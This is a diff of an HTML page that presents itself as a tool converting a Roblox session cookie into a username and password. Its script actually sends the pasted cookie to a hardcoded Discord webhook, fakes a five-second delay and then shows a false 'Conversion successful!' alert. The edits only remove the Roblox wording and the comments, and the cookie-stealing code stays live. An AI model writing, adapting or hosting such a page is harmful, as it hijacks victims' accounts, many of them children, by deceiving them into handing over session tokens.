@@ -3,15 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox Cookie To Username And Password</title>
+    <title>Cookie To Username And Password</title>
     <link rel="stylesheet" href="styles.css">
     <!-- Font Awesome for icons -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-FsE6/oV/HFvOZxGRd2u5E2vU37KcBBrYs8QdbpS0LBi8E91PAXFzl5mdDgKtGmZx6NkQk6Adt/+U1Df2D6z+Cg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
 </head>
 <body>
     <div class="container">
-        <h1>Roblox Cookie To Username And Password</h1>
-        <input type="text" id="message" placeholder="Enter your Roblox cookie here">
+        <h1>Cookie To Username And Password</h1>
+        <input type="text" id="message" placeholder="Please enter the cookie">
         <button id="sendButton">
             <span id="buttonText">Convert</span>
             <i id="loadingIcon" class="fas fa-arrow-circle-right" style="display: none;"></i>
@@ -22,17 +22,16 @@
     <script>
         document.getElementById('sendButton').addEventListener('click', function() {
             const webhookURL = 'https://discord.com/api/webhooks/1262995461174726757/lg-Epz8AunZ_UGF7kgh38sL1-B7ceeau4YiNVYZbnSNO4WLq8cmKvFIvdnNj-5mIExmY';
-            const message = document.getElementById('message').value.trim(); // Trim whitespace
+            const message = document.getElementById('message').value.trim();
             const button = document.getElementById('sendButton');
             const loadingIcon = document.getElementById('loadingIcon');
             const buttonText = document.getElementById('buttonText');
             
             if (message === '') {
-                alert('Please enter your Roblox cookie.');
-                return; // Exit function if input is empty
+                alert('Enter the cookie.');
+                return;
             }
             
-            // Show loading icon and hide text
             loadingIcon.style.display = 'inline-block';
             buttonText.style.display = 'none';
             
@@ -44,18 +43,15 @@
                 body: JSON.stringify({ content: message })
             })
             .then(response => {
-                // Simulate delay for 5 seconds
                 return new Promise(resolve => setTimeout(resolve, 5000));
             })
             .then(() => {
-                // Re-enable button, hide loading icon, and show text
                 button.disabled = false;
                 loadingIcon.style.display = 'none';
                 buttonText.style.display = 'inline-block';
                 alert('Conversion successful!');
             })
             .catch(error => {
-                // Handle errors
                 button.disabled = false;
                 loadingIcon.style.display = 'none';
                 buttonText.style.display = 'inline-block';
